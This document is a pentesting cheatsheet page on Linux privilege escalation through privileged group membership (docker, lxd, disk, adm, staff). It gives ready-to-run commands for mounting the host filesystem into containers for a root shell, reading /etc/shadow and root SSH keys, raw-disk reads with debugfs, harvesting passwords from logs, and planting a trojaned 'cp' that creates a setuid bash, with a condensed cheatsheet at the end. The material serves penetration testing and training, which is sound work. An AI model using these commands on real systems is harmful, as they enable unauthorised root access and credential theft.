---
title: 'Privileged Groups'
description: 'Linux privilege escalation via privileged groups — escaping LXD/LXC, Docker, and abusing disk, adm, and other high-privilege groups.'
---

# Privileged Groups

Users can be assigned to secondary groups that grant access to specific system resources, services, or files. Membership in certain groups is practically equivalent to root access.

---

## Quick Reference — Dangerous Groups

| Group | Privilege Granted | Exploitation Path |
|:------|:------------------|:------------------|
| `docker` | Spawn containers | Mount host `/` to container, access root files |
| `lxd` | Manage LXD containers | Mount host `/` to container, access root files |
| `disk` | Raw disk access | Use `debugfs` to read/write entire file system |
| `adm` | Read `/var/log` | Read sensitive data, passwords, or cron job details |
| `shadow` | Read `/etc/shadow` | Crack password hashes offline |
| `staff` | Write to `/usr/local` | Hijack scripts or binaries executed by root |

---

## 1. Enumeration

```bash
# Check current user's groups
id
groups

# Find all users in a specific group (e.g., docker)
grep 'docker' /etc/group

# Find all files owned by a specific group
find / -group <group_name> -type f 2>/dev/null
```

---

## 2. Docker Group

The `docker` group allows users to communicate with the Docker daemon. Because Docker containers can mount the host's file system, this is equivalent to root access.

### Exploitation

```bash
# 1. Check if docker is running and we can interact with it
docker images

# 2. Run a container, mounting the host's root directory to /mnt in the container
# (Use any image available locally, e.g., ubuntu, alpine)
docker run -v /:/mnt -it alpine chroot /mnt bash

# Note: If no images are available, you may need to pull one, but usually
# targets in closed environments have at least one image cached.
```

### Alternative: Retrieving SSH Keys / Hashes

```bash
# If you don't want an interactive shell, just read files:
docker run -v /:/mnt -it alpine cat /mnt/etc/shadow
docker run -v /:/mnt -it alpine cat /mnt/root/.ssh/id_rsa
```

!!! tip "Chroot"
    Using `chroot /mnt bash` inside the container makes your shell treat the mounted host root as the actual root, giving you a seamless root shell on the host filesystem.

---

## 3. LXC / LXD Group

LXD is Ubuntu's container manager. Like Docker, users in the `lxd` group can create privileged containers and mount the host file system.

### Exploitation Step-by-Step

**On Attacker Machine (if no image is present on target):**
```bash
# Clone the lxd-alpine-builder repository
git clone https://github.com/saghul/lxd-alpine-builder.git
cd lxd-alpine-builder

# Build the alpine image (must run as root)
sudo ./build-alpine

# Transfer the resulting .tar.gz file to the target machine
```

**On Target Machine:**
```bash
# 1. Import the image
lxc image import ./alpine-v3.16-x86_64-20220818_1423.tar.gz --alias alpine

# 2. Start the LXD initialization process (accept all defaults)
lxd init

# 3. Create a privileged container named 'r00t'
lxc init alpine r00t -c security.privileged=true

# 4. Mount the host root directory (/) to /mnt/root inside the container
lxc config device add r00t mydev disk source=/ path=/mnt/root recursive=true

# 5. Start the container and execute a shell
lxc start r00t
lxc exec r00t /bin/sh

# 6. Inside the container, you are root. Access the host filesystem:
cd /mnt/root
```

!!! warning "LXD Initialization"
    If `lxd init` fails (e.g., networking issues or storage pool errors), you may still be able to create containers if a default profile already exists.

---

## 4. Disk Group

The `disk` group grants raw read/write access to block devices (hard drives) in `/dev`. This completely bypasses file permissions.

### Exploitation using `debugfs`

```bash
# 1. Identify the root filesystem partition
df -h
ls -la /dev/sd*
# Let's say the root partition is /dev/sda1

# 2. Open the disk with debugfs
debugfs /dev/sda1

# 3. Inside debugfs, you can navigate and read files as root
debugfs:  ls
debugfs:  cat /root/.ssh/id_rsa
debugfs:  cat /etc/shadow
```

!!! tip "Writing files with `debugfs`"
    While `debugfs` is mostly used for reading, you can also modify the file system (e.g., add your SSH key to `/root/.ssh/authorized_keys` or modify `/etc/shadow`) if the filesystem is opened with write permissions, but it's risky and can corrupt the disk. Reading sensitive files is safer.

---

## 5. ADM Group

The `adm` group is traditionally used for system monitoring tasks. Members can read log files in `/var/log`. While not an immediate root shell, logs often contain sensitive data.

### Exploitation

```bash
# Search logs for passwords, sensitive tokens, or hidden paths
grep -i "password" /var/log/auth.log
grep -i "password" /var/log/syslog
grep -i "token" /var/log/apache2/access.log

# Monitor cron job execution to identify potential wildcard or PATH abuse targets
cat /var/log/cron
grep "CRON" /var/log/syslog
```

---

## 6. Staff Group

The `staff` group (common on Debian/Ubuntu) allows users to add local modifications to the system (`/usr/local`) without needing root privileges.

### Exploitation

```bash
# Check if /usr/local/bin or /usr/local/sbin are in root's PATH
# and if they come BEFORE standard directories like /usr/bin.
# Since staff can write to /usr/local/bin:

# Create a malicious script intercepting a common command (e.g., "cp")
echo '#!/bin/bash' > /usr/local/bin/cp
echo 'cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash' >> /usr/local/bin/cp
echo '/bin/cp "$@"' >> /usr/local/bin/cp
chmod +x /usr/local/bin/cp

# Wait for root to run "cp"
```

---

## Cheatsheet — Group Escalations in 30 Seconds

```bash
# Docker
docker run -v /:/mnt -it alpine chroot /mnt bash

# LXD (assuming image is imported as 'alpine')
lxc init alpine r00t -c security.privileged=true
lxc config device add r00t mydev disk source=/ path=/mnt/root recursive=true
lxc start r00t
lxc exec r00t /bin/sh

# Disk
debugfs /dev/sda1
debugfs: cat /root/.ssh/id_rsa
```
